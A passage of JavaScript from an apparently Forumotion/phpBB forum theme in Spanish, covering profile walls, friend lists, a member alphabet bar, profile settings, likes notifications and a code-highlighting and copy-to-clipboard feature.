                                f = init.g('.walltitulo')[0];
                            ops.scroll.top('#AAGquickvm_bb', 200);
                            ops.placeholderwall = c.placeholder;
                            c.placeholder = 'Responder a ' + s;
                            d.value = s;
                            init.replaceHtml(init.create('fragment', {
                                childs: [{
                                    tag: 'img',
                                    attributes: {
                                        src: src
                                    }
                                }, {
                                    tag: 'span',
                                    text: ' Responder en el muro de ' + s
                                }]
                            }), f, 'prepend');
                            break;
                        case 'guardar_wall':
                            var o = t.href,
                                a = init.closest(t.parentNode, 'li');
                            ops.xmlhRequest('', o, function () {
                                ops.toolbar.notify.go(ops.mi_nombre + ' : Guardaste el mensaje lo puedes buscar en tu inbox en guardados')
                                init.fadeOut(a, 200)
                            });
                            break;
                    }
                },
                sinMsg: function (a) {
                    var g = init.g('.inner', a)[0],
                        ol = init.g('ol', a),
                        h = init.create('span', {
                            childs: [{
                                tag: 'div',
                                class: 'inner'
                            }, {
                                tag: 'span',
                                class: 'corners-top'
                            }, {
                                tag: 'span'
                            }, {
                                tag: 'ol',
                                style: {
                                    width: '99%'
                                },
                                childs: [{
                                    tag: 'center',
                                    childs: [{
                                        tag: 'i',
                                        class: 'fas fa-sad-tear',

                                        style: {
                                            fontSize: '340px',
                                            color: 'rgb(63, 76, 107)',
                                            textShadow: '0 1px rgb(255, 255, 255)',
                                            fontStyle: 'normal'
                                        }
                                    }]
                                }]
                            }]
                        });
                    if (init.contiene(g, 'Ningún') || ol.length && ol[0].innerHTML == '') {
                        init.move(g, h, 'replaceWith');
                    }
                    return a
                },
                enviarPost: function (b, c, d, f) {
                    var a = 'username=' + init.fixedEncodeURIComponent(b) + '&folder=profile&mode=post_profile&post=1&message=' + init.fixedEncodeURIComponent(c) + '&subject=' + init.fixedEncodeURIComponent(d);
                    ops.xmlhRequest(a, '/privmsg', function (o) {
                        ops.responseXML = o.responseXML;
                        'undefined' != typeof f && f(this);
                    })
                },
            },
            amigos: {
                sinAmigos: function (a, b) {
                    var c = ops.nombre_perfil,
                        d = ops.mi_nombre;
                    a && c != d && (a.childNodes.length == 3 && init.borrar(a.lastChild), init.contiene(b, 'no tiene') && (b.style.visibility = 'hidden'))
                },
                formato: function (i) {
                    var e = init.g('#cp-main', i),
                        r = init.g('h1', e)[0],
                        n = init.g('.message-block', e),
                        o = init.g('ol', e),
                        ti = ops.nombre_perfil === ops.mi_nombre ? 'Mis amigos' : 'Amigos de ' + ops.nombre_perfil,
                        dA = init.create('fragment', {
                            childs: [{
                                tag: 'div',
                                class: 'amigosContenedor'
                            }]
                        });
                    r.innerHTML = (ti);
                    init.myarray(n, function (i) {
                        var c = init.closest(i, 'li'),
                            a = init.g('.message-footer', c)[0],
                            h = init.g('em', c),
                            j = init.g('.avatar', c)[0],
                            b = h.length ? 'green' : 'red',
                            r = init.uid(init.g('a', j)[0].href),
                            n = ops.idPerfil,
                            o = init.g('img', j)[0].src,
                            s = init.g('strong', c)[0],
                            l = init.fixedEncodeURIComponent(s.textContent),
                            f = !init.contiene(a, 'href="/profile?friend='),
                            p = f ? '/profile?mode=editprofile&page_profil=friendsfoes&remove=' + r + '&u=' + n : '/profile?friend=' + l + '&mode=editprofile&page_profil=friendsfoes',
                            li = init.create('li', {
                                class: 'friend_box',
                                childs: [{
                                    tag: 'div',
                                    class: 'user',
                                    childs: [{
                                        tag: 'img',
                                        attributes: {
                                            src: o
                                        },
                                    }, {
                                        tag: 'em',
                                        childs: [{
                                            tag: 'i',
                                            class: 'fa fa-wifi online ' + b
                                        }]
                                    }, {
                                        tag: 'h3',
                                        text: s.textContent,
                                    }, {
                                        tag: 'div',
                                        class: 'info',
                                        childs: [{
                                            tag: 'br'
                                        }, {
                                            tag: 'a',
                                            text: 'Ver perfil',
                                            attributes: {
                                                href: '/u' + r
                                            }
                                        }, {
                                            tag: 'a',
                                            text: '  ' + (f ? 'Suprimir' : 'Añadir') + ' de mi lista de amigos',
                                            attributes: {
                                                href: p,
                                                onclick: 'ops.perfil.amigos.añadir(this);return false'
                                            }
                                        }],
                                    }]
                                }]
                            });
                        init.move(dA.firstChild, li, 'append');
                    });
                    o.length ? init.replaceHtml(dA, o[0]) : ops.perfil.muro.sinMsg(e);
                    return e
                },
                setup: function (xml) {
                    var b = init.g('#main'),
                        g = init.g('span', ops.tabs)[3],
                        f = ops.nombre_perfil,
                        e = f === ops.mi_nombre;
                    b.classList.remove('wall');
                    b.classList.add('amigos');
                    document.title = e ? 'Mis Amigos' : 'Amigos de ' + f;
                    return ops.perfil.amigos.formato(xml);
                },
                mainAdd: function (a) {
                    var c, b, d, e, f, g;
                    if (a) {
                        b = init.g('a', a);
                        if (b.length) {
                            g = !init.contiene(b[0], 'a mi lista'),
                                f = init.create('i', {
                                    attributes: {
                                        id: g ? 'removeFriend' : 'addFriends',

                                    },
                                    class: 'fa fa-' + (g ? 'minus' : 'plus') + '-circle'
                                });
                            init.move(b[0], f, 'prepend', function (o, p) {
                                o.classList.add(g ? 'remove_friend' : 'add_friend');
                                o.addEventListener('click', function (x) {
                                    x.preventDefault();
                                    var id = this.href;
                                    ops.xmlhRequest('', id, function () {
                                        b[0].textContent = 'Solicitud enviada';
                                    });
                                }, false)
                            });
                        }
                    }
                },
                añadir: function (b) {
                    var n = b.textContent,
                        u = b.href,
                        c = init.contiene(n, 'Suprimir');
                    ops.xmlhRequest('', u, function (x) {
                        b.textContent = c ? 'Ya no somos amigos' : 'Solicitud enviada';
                        ops.toolbar.notify.go('Solicitud enviada', null, 'check', 'fas fa-check-double', false);
                    });
                },
            }
        },
        //members
        miembros: {
            position_ml: 'top',
            presets: ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'],
            bar: init.create('div', {
                attributes: {
                    id: 'memberlist_alphabar'
                }
            }),
            list: ml && init.g('#memberlist').nextSibling,
            change: function (a) {
                if (a.id != 'alphabar_actif') {
                    var actif = init.g('alphabar_actif');
                    if (actif) actif.id = '';
                    a.id = 'alphabar_actif';
                    ops.xmlhRequest('', a.href, function (d) {
                        ops.miembros.list.parentNode.innerHTML = init.g('#memberlist', d.responseXML).parentNode.innerHTML;
                        ops.miembros.list = init.g('#memberlist').nextSibling;
                        ops.miembros.insertBar();
                    });
                }
            },
            insertBar: function () {
                ops.miembros.bar.className = 'alphabar_' + ops.miembros.position_ml;
                ops.miembros.list.className += ' alphalist_' + ops.miembros.position_ml;
                ops.miembros.list.parentNode.insertBefore(ops.miembros.bar, ops.miembros.position_ml.toLowerCase() == 'bottom' ? ops.miembros.list.nextSibling : ops.miembros.list);
                /left|right/i.test(ops.miembros.position_ml) && ops.miembros.list.insertAdjacentHTML('afterend', '<div class="clear"></div>');
            },
            members: function () {
                if (ml) {
                    if (ops.miembros.list) {
                        var a = ops.miembros.presets,
                            b = window.location.search,
                            c = /left|right/i.test(ops.miembros.position_ml),
                            d = '<table><tbody>' + (c ? '' : '<tr>');
                        init.myarray(a, function (i) {
                            d += (c ? '<tr>' : '') + '<td><a href="/memberlist?mode=lastvisit&order=DESC&submit=Ok&username=' + i + '" ' + (new RegExp('username=' + i.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + '(?:$|&)').test(b) ? 'id="alphabar_actif"' : '') + ' onclick="ops.miembros.change(this); return false;">' + i + '</a></td>' + (c ? '</tr>' : '');
                        });
                        ops.miembros.bar.innerHTML = d + (c ? '' : '</tr>') + '</tbody></table>';
                        ops.miembros.insertBar();
                    }
                }
            },
        },
        //editar perfil
        config: {
            tabs: function () {
                var a = init.g('#tabs'),
                    b = init.g('li', a),
                    c = init.g('span', a),
                    d = [{
                        titulo: 'Información',
                        class: 'fas fa-marker'
                    }, {
                        titulo: 'Preferencias',
                        class: 'fa-cog'
                    }, {
                        titulo: 'Firma',
                        class: 'fa-cog',
                    }, {
                        titulo: 'Avatar',
                        class: 'fas fa-image'
                    }, {
                        titulo: 'Amigos',
                        class: 'fa-users'
                    }, {
                        titulo: 'Notificaciones',
                        class: 'fa-bell'
                    }, {
                        titulo: 'Supervisados',
                        class: 'fa-bookmark'
                    }, {
                        titulo: 'Favoritos',
                        class: 'fa-heart'
                    }],
                    len = 0;
                init.myarray(c, function (i) {

                    var pp = len++,
                        oo = d[pp],
                        ele = init.create('fragment', {
                            childs: [{
                                tag: 'i',
                                class: 'fa ' + oo.class,
                                attributes: {
                                    id: oo.titulo.toLowerCase()
                                },
                        }, {
                                tag: 'h4',
                                html: '&nbsp;' + oo.titulo
                        }]
                        });
                    init.replaceHtml(ele, i);
                });
                var li = init.closest(c[2], 'li');
                init.contiene(li, 'Firma') && init.borrar(li);
            },
            contraseña: function (c) {
                var a = init.g('#new_password'),
                    b = init.g('#password_confirm'),
                    c = init.g('#cur_password'),
                    d = 'cur_password=' + init.fixedEncodeURIComponent(c.value) + '&new_password=' + a.value + '&password_confirm=' + b.value + '&change_password=change_password&page_profil=informations&mode=editprofile&user_id=' + ops.mi_id + '&submit=1',
                    f = 'Debes completar los campos obligatorios',
                    g = 'ingresaste no coincide',
                    h = 'La contraseña actual que ingresaste no coincide',
                    i = 'Tu contraseña no respeta las medidas',
                    j = 'Prueba con una contraseña más compleja',
                    k = 'Tu perfil ha sido actualizado',
                    l = ops.mi_nombre + ': tu contraseña se cambió con éxito',
                    n = 'No coinciden las contraseñas, escribelas de nuevo';
                a.value != b.value ? ($.boxes('alert', n)) : ops.xmlhRequest(d, '/profile', function (o) {
                    var e = o.responseXML,
                        d = init.g('.error', e)[0],
                        m = d.textContent;
                    return init.contiene(m, f) ? ($.boxes('alert', f), !1) : init.contiene(m, g) ? ($.boxes('alert', h), !1) : init.contiene(m, i) ? ($.boxes('alert', j), !1) : void(init.contiene(m, k) && (a.value = '', b.value = '', c.value = '', ops.toolbar.notify.go(l, null, 'check', 'fas fa-check-double', false), setTimeout(function () {
                        $('.l_pass').slideUp(function () {
                            $(this).remove()
                        })
                    }, 1000)))
                })
            },
            colocarBoton: function (c) {
                c.parentNode.insertAdjacentHTML('afterend', ops.html.l_pass);
            },
            re: function (cp, doc) {
                var cpmain = cp,
                    c = doc.forms.post,
                    a = init.g('.activetab')[0],
                    b = init.g('a', a)[0].textContent.match(/\S(\w.+)/g)[0],
                    d = c && c.submit,
                    d1 = doc.forms.notif_opts && doc.forms.notif_opts.submit,
                    d2 = doc.forms.notif_list && doc.forms.notif_list.delete,

                    f = init.g('.table1', doc),
                    t = init.g('.topictitle', doc),
                    u = init.create('fragment', {
                        childs: [{
                            tag: 'span',
                            class: 'favNotice',
                            style: {
                                color: '#333',
                                textAlign: 'center',
                                width: '100%',
                                display: 'block',
                                height: '50px',
                                lineHeight: '2.5',
                                fontSize: '20px',
                            },
                            childs: [{
                                tag: 'i',
                                class: 'fa fa-eraser',
                                attributes: {
                                    'aria-hidden': 'true',
                                },
                            }, {
                                tag: 'span',
                                text: 'No tienes favoritos'
                            }]
                        }]
                    }),
                    cambiar = function (a, b) {
                        init.move(a, b, 'replaceWith', function (x, y) {
                            ops.perfil.main.variables();
                            init.fadeIn(y, 500);
                        });
                    };
                switch (b) {
                    case 'Información':
                        var f = init.g('.f_cr', init.g('.field_c_r', doc)[1]),
                            g = [f[3], f[4], f[5], f[6], f[7]],
                            h = init.g('.contactos_reg', doc)[0],
                            j = init.g('#password_', doc);
                        init.myarray(g, function (i) {
                            init.borrar(i)
                        });
                        init.hide(h);
                        d.addEventListener('click', function (w) {
                            w.preventDefault();
                            ops.config.sendForm('post');
                        }, false);
                        j.innerHTML = '<button id="change_pass" onclick="ops.config.colocarBoton(this);return false">Modificar</button>';
                        break;
                    case 'Preferencias':
                        d.addEventListener('click', function (e) {
                            e.preventDefault();
                            ops.config.sendForm('post');
                        }, false);
                        ops.confirm();
                        ops.config.cambiarTextos(doc);
                        break;
                    case 'Avatar':
                        ops.config.cambiarAvatar();
                        break;
                    case 'Notificaciones':
                        init.g('#cp-main', doc).classList.add('editTable');
                        d1.addEventListener('click', function (e) {
                            e.preventDefault();
                            ops.config.sendForm('notif_opts');
                        }, false);
                        d2.addEventListener('click', function (e) {
                            e.preventDefault();
                            ops.config.sendForm('notif_list');
                        }, false);
                        setTimeout(function () {
                            ops.config.notif()
                        }, 100);
                        break;
                    case 'Amigos':
                        ops.config.amigos.setup(doc);
                        break;
                    case 'Favoritos':
                    case 'Supervisados':
                        ops.prefijos();
                        init.g('#cp-main', doc).classList.add('editTable');
                        !t.length && init.replaceHtml(u, f[0]);
                        d.length && d.addEventListener('click', function (e) {
                            e.preventDefault();
                            ops.config.sendForm('supervisados', function () {
                                ops.toolbar.notify.go(ops.mi_nombre + ' se eliminaron temas de tus ' + (b == 'favoritos' ? 'favoritos' : 'supervisados'), null, 'check', 'fas fa-exclamation-circle')
                                var f = init.g('.posts', doc);
                                init.myarray(f, function (i) {
                                    i.firstChild.checked && init.fadeOut(init.closest(i, 'tr'), 200)
                                })
                            })
                        }, false);
                        break;
                }
                cambiar(cp, init.g('#cp-main', doc));
            },
            cambiarTextos: function (doc) {
                var a = init.g('.pref_tres', doc),
                    b = init.g('.pref_siete', doc),
                    d = b.length && b[0].children[1].firstChild.firstChild;
                a.length && (a[0].firstChild.firstChild.textContent = 'Autorizar los mensajes en mi muro :');
                d && (d.setAttribute('disabled', true), d.style.opacity = 0.5);

            },
            notif: function () {
                if (pr) {
                    var b,
                        e = ' comentó en: ',
                        t = 'este tema ',
                        f = init.g('.table1')[1],
                        c = init.g('a', f),
                        d = window.location.host;
                    f.innerHTML = f.innerHTML.replace(/ha escrito un mensaje en/g, e);
                    init.myarray(c, function (i) {
                        var l, o = i.href,
                            a = o.match(/\/t(\d+)/g),
                            n = a && /^[\s-]*$/.test(o) ? t : o.replace('http://' + d, '').replace(/(\/t(\d+)p(\d+)|\/t(\d+))/g, '').replace(/-/g, ' ').replace(/\?nid=(.*)/g, '');
                        a && (i.innerHTML = n);
                    });
                }
            },
            amigos: {
                setup: function (cp) {
                    var b, a = init.g('.friends-foes-list', cp),
                        d = init.g('#main-content'),
                        c = '<i class="fa fa-wifi online green"></i>',
                        e = init.g('.page-title', cp);
                    document.title = 'Amigos';
                    d.className += ' user-ctrl-friends';
                    e.length == 4 && init.borrar(e[3].nextSibling);
                    init.myarray(a, function (i) {
                        b = init.g('em', i);
                        if (b.length) {
                            b[0].innerHTML = c;
                        }
                    });
                    ops.dataFrs();
                    ops.confirm();
                    ops.config.amigos.avatar(cp);
                },
                avatar: function (cp) {
                    var t, e, c, a = init.g('.friends-foes-list', cp);
                    init.myarray(a, function (i) {
                        e = init.g('a', i)[0].href;
                        t = init.uid(e);
                        c = init.create('span', {
                            class: 'user-ava',
                            childs: [{
                                tag: 'img',
                                attributes: {
                                    src: ops.getAva(t)
                                }
                            }]
                        });
                        init.move(i, c, 'prepend');
                    });
                },
            },
            setup: function (cp, doc) {
                if (pr || sr) {
                    var h, baner, j, k,
                        g = init.g('#main'),
                        i = init.g('#tabs');
                    g.className += ' profile_';
                    init.g('a', i)[0].href = 'profile?mode=editprofile';
                    ops.perfil.main.portada.b();
                    ops.config.re(cp, doc)
                }
            },
            sendForm: function (a, f) {
                var b = document.forms,
                    c = a == 'post' ? ops.serialize(b.post) + '&submit=1' : a == 'notif_list' ? 'delete_all=1&tid:=' + isTid : a == 'notif_opts' ? ops.serialize(b.notif_opts) + '&submit=1' : a == 'supervisados' && ops.serialize(b.post) + '&confirm=1',
                    d = a == 'post' ? '/profile' : a == 'notif_list' ? '/profile?mode=editprofile&page_profil=notifications' : 'notif_opts' ? '/profile?mode=editprofile&page_profil=notifications&updated=1' : 'supervisados' && b.post.action;
                ops.xmlhRequest(c, d, function (x) {
                    var o = x.responseXML,
                        e = init.g('html', o);
                    if (e.length && init.contiene(e[0], 'actualizado')) {
                        ops.toolbar.notify.go(ops.mi_nombre + ' tu perfil ha sido actualizado', null, 'check', 'fas fa-exclamation-circle');
                    }
                    'undefined' != typeof f && f(this);
                });
            },
            cambiarAvatar: function () {
                document.forms.post.submit.addEventListener('click', function (d) {
                    d.preventDefault();
                    ops.config.sendForm('post');
                    window.localStorage.removeItem('user_ava_' + ops.mi_id);
                    ops.toolbar.notify.go(ops.mi_nombre + ': Tu avatar se actualizó', null, 'check', 'fas fa-exclamation-circle');
                    setTimeout(function () {
                        window.location.reload();
                    }, 1000)
                });
            },
            cerrar: function (c) {
                init.borrar(init.g('.l_pass')[0])
            },
        },
        //temas
        temas: {
            likes:{
             avatar: function(){
                var a = init.g('.fa_like'); 
                init.myarray(a, function(i){
                i.addEventListener('click', function(){   
                setTimeout(function(){
                ops.temas.likes.createAva();
                ops.temas.likes.actividad(i);
                ops.temas.likes.disable();
                 },200);
                },false);
                });
             },
             disable: function(){
                var a = init.g('.fa_liked'); 
                init.myarray(a, function(i){
                i.disabled = true
                })
             },
             createAva: function(){
                var b = init.g('.fa_like_list');
                  init.myarray(b, function (i) {
                    var t, e, c,
                    av = init.g('a', i);
                    init.myarray(av, function (a) {
                    e = a.href;
                    t = init.uid(e);
                    c = init.create('img',{
                        class:'like_avatar',attributes:{
                        src:ops.getAva(t)
                    }
                    }); 
                    !init.g('.like_avatar', a).length && init.move(a, c, 'prepend');
                  });
                });
               },
               move: function(){
                var t = init.g('.rep-button');
                init.myarray(t, function (i) {
                    var e = init.closest(i, '.post'),
                        a = init.g('.like_container', e)[0];
                        init.move(a, i, 'append' )
                });
                ops.temas.likes.disable();
               },
               actividad: function (d) {
                   debud= e = init.closest(d, '.post');
                var e = init.closest(d, '.post'),
                    o = ops.mi_nombre,
                    a = e.id.match(/\d+/g)[0],
                    b = init.g('.postNumber', e)[0].href,
                    t = init.g('.nick', e)[0].textContent,
                    f = '[likes]Hola :) , me gusta tu post en el tema: [url=' + b + ']' + ops.topic_name() + ' [/url][/likes]',
                    g = '/privmsg',
                    h = 'profile',
                    i = 'post_profile',
                    j = ' Tu like a ' + t + ' quedó registrado',
                    k = '1',
                    l = ops.lang.wall_message_title + ' ' + ops.topic_name(),
                    m = 'A ' + o + ' le gusta el post #' + a + ' de ' + t + ' en el tema:[url=' + document.location.href + ']' + ops.topic_name() + '#' + a + ' [/url]';
                ops.temas.main.post_mw(t, l, f, g, i, j, h, k, '');
                ops.actividadFeed(m, 'Historial');
                ops.actividadFeed(m, 'Likes');
            },
            },
            main: {
                post_mw: function (t, d, f, g, i, j, h, k, z) {
                    var a = {
                        username: t,
                        folder: h,
                        mode: i,
                        post: 1,
                        message: f,
                        subject: d,
                        usergroup: z != false ? z : ''
                    };
                    ops.xmlhRequest(a, '/privmsg', function (o) {
                        j = 'undefined' != typeof j ? j : 'Se envió un mensaje  correctamente';
                        ops.toolbar.notify.go(j, null, 'check', 'fas fa-exclamation-circle')
                    })
                },
                getter: function () {
                    var b = init.g('.mentiontag');
                    init.myarray(b, function (i) {
                        var t, ava,
                            e = i.href;
                        if ('undefined' != typeof e) {
                            t = init.uid(e);
                            ava = init.create('div', {
                                class: 'avanotif',
                                childs: [{
                                    tag: 'img',
                                    attributes: {
                                        src: ops.getAva(t)
                                    }
                                }]
                            });
                            !init.g('.avanotif', i).length && init.move(i, ava, 'prepend');
                        }
                    })
                },
                copy: function () {
                    document.querySelectorAll('dl.codebox').length >= 1 && init.cachedScript('https://allphpbb31.com/js/copy.js', function () {
                        function t(t) {
                            var e = '',
                                o = 'cut' === t ? 'X' : 'C';
                            return e = /iPhone|iPad/i.test(navigator.userAgent) ? 'No support!' : /Mac/i.test(navigator.userAgent) ? 'Press ⌘-' + o + ' to ' + t : 'Press Ctrl-' + o + ' to ' + t
                        }

                        function clearall(t, e) {
                            setTimeout(function () {
                                t.className = 'fa fa-clipboard';
                                e.clearSelection()
                            }, 1e3)
                        }
                        var n, e, o = init.g('code');
                        if (o.length) {
                            var i = init.g('.copy_code');
                            init.myarray(i, function (t) {
                                var html = init.create('fragment', {
                                    childs: [{
                                        tag: 'i',
                                        style: {
                                            color: '#fff',
                                            marginRight: '5px',
                                            cursor: 'pointer',
                                            display: 'initial',
                                        },
                                        class: 'fa fa-clipboard ready_copy',
                                        childs: [{
                                            tag: 'b',
                                            style: {
                                                fontFamily: 'monda',
                                                color: '#fff',
                                            },
                                            text: 'Copiar contenido'
                                        }]
                                    }]
                                });
                                html.firstChild.setAttribute('data-clipboard', '');
                                !init.contiene(t, 'ready_copy') && init.replaceHtml(html, t);
                            });
                            n = new Clipboard('[data-clipboard]', {
                                target: function (t) {
                                    e = init.g('dd', init.closest(t, 'dl'))[0];
                                    return e
                                }
                            });
                            n.on('success', function (t) {
                                t.trigger.className = 'fa fas fa-check-double';
                                clearall(t.trigger, t)
                            });
                            n.on('error', function (o) {
                                o.trigger.className = 'fa fa-exclamation-circle';
                                clearall(o.trigger);
                                alert(t(o.action))
                            })
                        }
                    });
                },
                selectCode: function (e) {
                    var t, o;
                    if (window.getSelection) {
                        t = window.getSelection();
                        if (t.setBaseAndExtent) t.setBaseAndExtent(e, 0, e, e.innerText.length - 1);
                        else {
                            window.opera && '<BR>' === e.innerHTML.substring(e.innerHTML.length - 4) && (e.innerHTML += ' ');
                            var o = document.createRange();
                            o.selectNodeContents(e), t.removeAllRanges(), t.addRange(o)
                        }
                    } else document.getSelection ? (t = document.getSelection(), o = document.createRange(), o.selectNodeContents(e), t.removeAllRanges(), t.addRange(o)) : document.selection && (o = document.body.createTextRange(), o.moveToElementText(e), o.select())
                },
                panda: function () {
                    function a(z, w) {
                        return w ? z.replace(/\r?\n/g, '<br/>') : z.replace(/\<br\s?\/?\>/gi, '\n')
                    }

                    function t(z, w) {
                        return '<span clapanda="' + z + '">' + w + '</span>'
                    }

                    function v(z, A, w) {
                        return z.replace(RegExp('\\b(?:' + A.join('|') + ')\\b', 'g'), function (B) {
                            return t(w, B)
                        })
                    }

                    function u(z, A, w) {
                        for (var B in A) {
                            w = w.replace(A[B], function (C) {
                                return t(z + '-' + B, C)
                            })
                        }
                        return w
                    }
                    var s = {
                        cacheIdentity: !0,
                        installedLanguages: [],
                        languages: {},
                        regex: {
                            comment1: /\/\/[^\n]*/g,
                            comment2: /\/\*(.|[\n\r])*?\*\//gm,
                            comment3: /#[^\n]*/g,
                            string: /(['"])(?:\\?.)*?\1/g,
                            operators: /[!=\+%\*\-][!=\+\-]?|&(?:amp;){2}|&gt;|&lt;|(?:\|\|)/g,
                            extra: /[:\{\}\[\]\(\)]/g
                        },
                        parse: function (E, X) {
                            var D = s.languages[E];
                            if (!D) {
                                return X
                            }
                            var B = D.matchers,
                                V = D.keywords,
                                F = D.specials,
                                A = (new Date).getTime(),
                                C = {};
                            X = a(X).replace(/\</g, '&lt;').replace(/>/g, '&gt;').replace(/&nbsp;/g, '');
                            for (var U = 0, R = 0, Y; Y = B[U++];) {
                                var W = this.regex[Y],
                                    z = '\u00a3panda_' + Y + '_' + A + '_',
                                    T = C[Y] = {},
                                    Q = !1;
                                W && (W.inner && (Q = W.inner, W = W.outer), X = X.replace(W, function (G) {
                                    var w = z + R++ + '_' + (W.multiline ? 'm_' : '') + 'panda\u00a3';
                                    Q && (G = u('panda-' + Y, Q, G));
                                    T[w] = G;
                                    return w
                                }))
                            }
                            V.length && (X = v(X, V, 'panda-keyword'));
                            F.length && (X = v(X, F, 'panda-special'));
                            D.noints || (X = X.replace(/\b\d+(?:\.\d+)?\b/g, function (w) {
                                return t('panda-int', w)
                            }));
                            for (U = B.length; U; U--) {
                                Y = B[U - 1];
                                var D = C[Y],
                                    S;
                                for (S in D) {
                                    V = D[S], S.indexOf('_m_') && (V = V.replace(/\n/g, '</span>\n<span clapanda="panda-' + Y + '">')), X = X.replace(S, t('panda-' + Y, V))
                                }
                            }
                            X = X.split(' ').join('&nbsp;').replace(/&nbsp;clapanda=/g, " class=").replace(/\t/g, "&nbsp;&nbsp;&nbsp;&nbsp;");
                            return a('<ol><li class="panda-line">' + X.split(/\n/).join('</li><li class="panda-line">') + '</li></ol>', 1)
                        },
                        identify: function (z) {
                            if (z.pandaType) {
                                return z.pandaType
                            }
                            var w = /(?:\s|^)panda[_-](\w+)(?:\s|$)/;
                            return w.test(z.className) ? w.exec(z.className)[1] : 'default'
                        },
                        colorNode: function (z) {
                            if (z.className.indexOf('panda-code') < 0) {
                                var w = s.identify(z);
                                s.cacheIdentity && (z.pandaType = w);
                                z.className += ' panda-code panda-' + w;
                                z.innerHTML = s.parse(w, z.innerHTML)
                            }
                        },
                        addSpecials: function (z, w) {
                            this.addKeywords(z, w, !0)
                        },
                        addKeywords: function (z, A, w) {
                            if (z in s) {
                                for (var C = 0, B = A.length; C < B; C++) {
                                    s.languages[z][w ? 'specials' : 'keywords'].push(A[C])
                                }
                            }
                        },
                        addLang: function (z, A) {
                            if ('matchers' in A) {
                                var w = s.languages[z] = {};
                                s.installedLanguages.push(z);
                                w.matchers = 'string' === typeof A.matchers ? A.matchers.split(' ') : A.matchers;
                                w.specials = ('string' === typeof A.specials ? A.specials.split(' ') : A.specials) || [];
                                w.keywords = ('string' === typeof A.keywords ? A.keywords.split(' ') : A.keywords) || [];
                                if (A.regex && 'object' === typeof A.regex) {
                                    for (var B in A.regex) {
                                        s.regex[B] = A.regex[B]
                                    }
                                }
                            }
                        }
                    };
                    window.panda = s;
                    s.addLang('default', {
                        matchers: 'string comment1 comment2 JSglobal regexp operators extra',
                        specials: 'Array RegExp Object Math String Number Date Function Boolean charAt charCodeAt concat fromCharCode indexOf lastIndexOf match replace search slice split substr substring toLowerCase toUpperCase valueOf join pop push reverse shift slice sort splice toString unshift getDate getDay getFullYear getHours getMilliseconds getMinutes getMonth getSeconds getTime getTimezoneOffset getUTCDate getUTCDay getUTCFullYear getUTCHours getUTCMilliseconds getUTCMinutes getUTCMonth getUTCSeconds getYear parse setDate setFullYear setHours setMilliseconds setMinutes setMonth setSeconds setTime setUTCDate setUTCFullYear setUTCHours setUTCMilliseconds setUTCMinutes setUTCMonth setUTCSeconds setYear toDateString toGMTString toISOString toJSON toLocaleDateString toLocaleTimeString toLocaleString toString toTimeString toUTCString UTC abs acos asin atan atan2 ceil cos exp floor log max min pow random round sin sqrt tan toExponential toFixed toPrecision compile exec test decodeURI decodeURIComponent encodeURI encodeURIComponent escape eval isFinite isNaN parseFloat parseInt String unescape',
                        keywords: 'break case catch continue default delete do else finally for function if in instanceof new return switch this throw try typeof var void while with null true false',
                        regex: {
                            regexp: /\/(\\\/|.)*?\//g,
                            JSglobal: /\b(?:document|window|navigator|screen)\b/gi
                        }
                    });
                    s.onload = function () {
                        for (var z = init.g('code'), A = 0, w; w = z[A++];) {
                            w.className.indexOf('panda-code') < 0 && s.colorNode(w)
                        }
                    }
                    ops.temas.main.panda_onload();
                },
                panda_onload: function () {
                    var a = ['default', 'dark', 'deepsea', 'bright', 'neon', 'desert', 'plain', 'geany', 'github'],
                        t = init.g('code'),
                        A = my_getcookie('panda-theme'),
                        z = '<option value="null"> -------------- </option>';

                    init.myarray(a, function (i) {
                        z += '<option value="' + i + '" ' + (A && A === i ? ' selected="selected"' : '') + '>';
                        z += i.charAt(0).toUpperCase() + i.substr(1) + "</option>"
                    });
                    init.myarray(t, function (i) {
                        var a = init.closest(i, '.codebox'),
                            b = init.g('.cabecera', a),
                            c = '<span class="panda-theme-select"> Tema: <select onchange="ops.temas.main.set_panda_theme(this.value)">' + z + '</select></span>';
                        panda.colorNode(i);
                        !init.contiene(b[0], 'panda-theme-select') && init.insertar(b[0], c, 'append');
                    });
                    A && ops.temas.main.set_panda_theme(A, t)
                },
                set_panda_theme: function (u, s) {
                    s = s || init.g('code');
                    init.myarray('e', s, function (c) {
                        c.className = c.className.replace(/\s?panda-theme-\w+\s?/, '') + ' panda-theme-' + u;
                    });
                    my_setcookie('panda-theme', u, 1)
                },
                fullview: function (c, u) {
                    var a = init.closest(c, '.thugon'),
                        o = c.className,
                        post = init.closest(a, '.post'),
                        next = c.nextSibling,
                        previous = c.previousSibling,
                        clear = init.g('.clearfix', post)[0],
                        A = init.contiene(o, 'fullOff'),
                        B = init.contiene(o, 'fullOn'),
                        C = init.contiene(o, 'viewfull'),
                        D = init.contiene(o, 'viewhide'),
                        scroll = function () {
                            if (C || D) {
                                a.previousSibling.style.height = u;
                                ops.scroll.top(clear, 300)
                            }
                        }
                    if (A) {
                        init.show(next, 'inherit');
                        Cookies.set('c_so', u, {
                            expires: 1
                        });
                    } else if (B) {
                        init.show(previous, 'inherit');
                        Cookies.remove('c_so');
                    } else if (C) {
                        init.show(next, 'inherit');
                        a.classList.add('restore')
                    } else if (D) {
                        init.show(previous, 'inherit');
                        a.classList.remove('restore')
                    }
                    scroll();
                    init.hide(c);
                },
                colapso: function () {
                    var t, a, f, b, c, d, g, h, e = init.g('.post');
                    init.myarray(e, function (t) {
                        a = init.g('.content', t)[0];
                        f = init.create('p', {
                            class: 'thugon',
                            childs: [{
                                tag: 'span',
                                childs: [{
                                    tag: 'span',
                                    class: 'viewfull',
                                    attributes: {
                                        onclick: 'ops.temas.main.fullview(this, \'100%\')'
                                    },
                                    text: 'Seguir leyendo...'
                                }, {
                                    tag: 'span',
                                    class: 'viewhide',
                                    attributes: {
                                        onclick: 'ops.temas.main.fullview(this, \'400px\')'
                                    },
                                    style: {
                                        display: 'none'
                                    },
                                    text: 'Leer menos'
                                }]
                            }, {
                                tag: 'span',
                                class: 'fullOff',
                                attributes: {
                                    onclick: 'ops.temas.main.fullview(this, \'100%\')'
                                },
                                style: {
                                    float: 'right'
                                },
                                childs: [{
                                    tag: 'i',
                                    class: 'fa fa-power-off',
                                    style: {
                                        color: 'rgba(255, 0, 0, 1)',
                                    }
                                }, {
                                    tag: 'text',
                                    text: 'Desactivar colapso'
                                }]
                            }, {
                                tag: 'span',
